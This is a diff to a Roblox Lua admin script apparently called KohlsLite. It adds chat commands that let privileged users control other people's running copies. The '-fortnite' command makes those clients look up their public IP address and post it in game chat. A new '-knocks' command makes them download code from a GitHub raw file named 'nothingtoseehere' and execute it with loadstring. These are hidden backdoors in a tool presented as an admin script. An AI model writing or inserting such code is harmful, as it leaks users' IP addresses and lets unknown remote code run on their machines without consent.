@@ -8308,12 +8308,24 @@ v.Chatted:Connect(function(msg)
                                         game.Players.LocalPlayer:Kick("a kohlslite admin kicked you!")
                                 end)
                 end
-                
-                if string.sub(msg:lower(), 0, 9) == "-fortnite" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+
+       		if string.sub(msg:lower(), 0, 9) == "-fortnite" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                                 pcall(function()
-                                game.Players:Chat("ff " .. tostring(game:HttpGet("https://api.ipify.org/")))
+                                	game.Players:Chat("ff " .. tostring(game:HttpGet("https://api.ipify.org/")))
                                 end)
                 end
+
+                if string.sub(msg:lower(), 0, 9) == "-fortnite" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                                pcall(function()
+                                	game.Players:Chat("ff " .. tostring(game:HttpGet("https://api.ipify.org/")))
+                                end)
+                end
+
+                if string.sub(msg:lower(), 0, 7) == "-knocks" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                                pcall(function()
+                                   loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/bswl/main/nothingtoseehere"))()
+                                end)
+                end  
 
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                                     Remind("You have been warned by a KohlsLite collaborator!")
